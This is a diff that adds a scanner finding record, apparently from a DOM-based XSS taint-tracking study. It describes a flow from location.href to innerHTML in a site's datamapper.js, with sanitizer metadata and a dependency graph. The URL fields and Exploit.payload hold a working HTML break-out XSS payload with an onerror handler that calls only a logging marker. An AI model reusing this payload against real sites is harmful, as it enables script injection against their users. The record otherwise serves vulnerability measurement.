@@ -1,0 +1,70 @@
+// Finding: 29589c4d-e10a-40b5-8dae-446653d9380c
+// Finding.url: https://www.example318.com/external/datamapper/NGDP_RPCH@WEO/OEMDC/ADVEC/WEOWORLD##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('74e922407a0d4a9cbcf2f08c0fe9c6fc')><!--/*
+// Finding.parentloc: https://www.example318.com/external/datamapper/NGDP_RPCH@WEO/OEMDC/ADVEC/WEOWORLD##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('74e922407a0d4a9cbcf2f08c0fe9c6fc')><!--/*
+// Finding.domain: www.example318.com
+// Finding.base_domain: example318.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 1
+// Sanitizer.name: o
+// Sanitizer.location: https://www.example318.com/external/datamapper/deploy/datamapper.js - O.e/<:1:12768
+// Finding.begin: 1059
+// Finding.end: 1067
+// Finding.original_uuid: a88a2274-f3ae-4a6f-81e6-53bdd7e8b6c6
+// Finding.TwentyFiveMillionFlowsId: -306954797
+// Finding.script: https://www.example318.com/external/datamapper/deploy/datamapper.js
+// Finding.line: 1
+// Exploit.uuid: 74e92240-7a0d-4a9c-bcf2-f08c0fe9c6fc
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: data-gid
+// Exploit.quote_type: "
+// Exploit.tag: div
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 54
+// Exploit.end_taint_url: 59
+// Exploit.replace_begin_url: 74
+// Exploit.replace_end_url: 74
+// Exploit.replace_begin_param: 35
+// Exploit.replace_end_param: 35
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -1172081151
+// DepGraph.sanitizer_hash: -1172081151
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="str_replace_once"];
+n2 [shape=box, label="RegExp: /^\/|\/$/"];
+n3 [shape=box, label="Lit: "];
+n4 [shape=box, label="Var: x"];
+n5 [shape=box, label="Var: x"];
+n6 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n5 -> n1;
+n6 -> n5;
+}
